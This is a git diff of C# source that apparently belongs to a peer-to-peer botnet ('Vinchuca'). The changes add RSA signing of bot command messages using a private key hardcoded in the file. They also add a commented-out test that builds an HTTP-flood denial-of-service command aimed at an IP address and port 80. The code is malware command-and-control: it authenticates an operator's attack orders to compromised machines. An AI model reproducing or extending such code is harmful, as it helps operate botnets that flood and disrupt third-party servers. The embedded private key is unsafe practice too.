@@ -1,6 +1,9 @@
 ﻿using System;
 using System.IO;
+using System.Net;
+using System.Security.Cryptography;
 using Vinchuca.Crypto;
+using Vinchuca.REPL;
 
 namespace Vinchuca.Network.Protocol.Messages.Command
 {
@@ -8,16 +11,41 @@ namespace Vinchuca.Network.Protocol.Messages.Command
     {
         public Guid Nonce { get; set; }
 
+        public override byte[] Encode()
+        {
+            var payload = base.Encode();
+            var signer = new Signature();
+            var signedPayload = signer.Sign(payload, GetPrivateKey());
+            return signedPayload;
+        }
+
         public override void Decode(BinaryReader br)
         {
             base.Decode(br);
-            br.BaseStream.Seek(BotHeader.Size, SeekOrigin.Begin);
-            var signedPayload = br.ReadBytes(10);
-            var sign = new Signature();
-            sign.Verify(signedPayload);
+            br.BaseStream.Seek(0, SeekOrigin.Begin);
+            var signedPayload = br.ReadBytes(4 * 1024);
+            var signer = new Signature();
+            signer.Verify(signedPayload);
         }
 
-        public void xxx()
+        //public void test()
+        //{
+        //    var ddos = new DosAttackMessage()
+        //    {
+        //        Nonce = Guid.NewGuid(),
+        //        AttackId = 123456,
+        //        Target = new IPEndPoint(IPAddress.Parse("200.200.200.1"), 80),
+        //        Threads = 4,
+        //        Type = DosAttackMessage.DosType.HttpFlood,
+        //        Buffer = new byte[0]
+        //    };
+
+        //    var encoded = ddos.Encode();
+        //    var other = new DosAttackMessage();
+        //    other.Decode(new BinaryReader(new MemoryStream(encoded)));
+        //}
+
+        public RSACryptoServiceProvider GetPrivateKey()
         {
             var privKeyStr = 
 @"MIICXQIBAAKBgQDEuMdX757iaBkrxN51IQMILf+o7nJhfddEQ8gurVNYgoGxg19N
@@ -34,7 +62,8 @@ nQmGihDs5/4OBLub/edob4+74ynYZkKdL5FZJFM4i30LrI4J5egPHg08WgQj3f7Y
 jNhGfEH/4V6+sF+eqAsCQQCTl/A2JqF6CThIdk6zLF40cJGRFOkAcRqsrV3Q64XD
 C2rpXXqnjJlqysIFEmnUmxm64ckMyg96b1CxeW0F4Tr7";
             var privKey = Convert.FromBase64String(privKeyStr);
-            var prvRsa = RsaUtils.LoadPrivateKey(privKey);
+            var prvRsa  = RsaUtils.LoadPrivateKey(privKey);
+            return prvRsa;
         }
     }
 }
